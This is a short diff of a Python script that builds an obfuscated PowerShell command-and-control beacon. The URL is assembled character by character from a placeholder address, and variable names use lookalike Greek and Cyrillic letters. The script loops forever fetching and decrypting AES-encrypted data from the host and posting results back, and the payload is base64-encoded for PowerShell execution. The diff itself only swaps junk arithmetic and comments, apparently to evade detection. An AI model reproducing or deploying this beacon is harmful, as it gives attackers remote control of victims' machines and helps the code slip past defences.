@@ -19,10 +19,8 @@ $А.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $А.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 $А.Key = $Κ
 $U='h'+ 't'+ 't'+ 'p'+':'+ '/'+'/'+ '0'+ '0'+'0'+'.'+'0'+ '0'+'0'+'.'+'0'+'0'+'0'+'.'+'0'+ '0'+ '0'+':'+ '8'+'0'+'0'+ '0'
-# ???????????????????????????????????????????¯\_(ツ)_/¯ 
 #
 while($true){{
-    
     $А.IV=New-Object byte[] 16
     $D=$А.CreateDecryptor()
     $R=Invoke-WebRequest -Uri $U
@@ -37,11 +35,7 @@ while($true){{
     
     #
     Invoke-WebRequest -Uri $U -Method POST -Body $C
-    #ツツツツツツツツツツツツツツツツツツツツツツツ ¯\_(?)_/¯  
-    $Θ = 10 + 2 * 3 / 4 - 5
-    $Γ = $Κ + $Θ
-    $Δ = $Γ + $Κ
-    $Ν = $Δ / 2
+    # ??????????この辺には何もない????????????¯\_( ? )_/¯
 }}
 '''
 e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
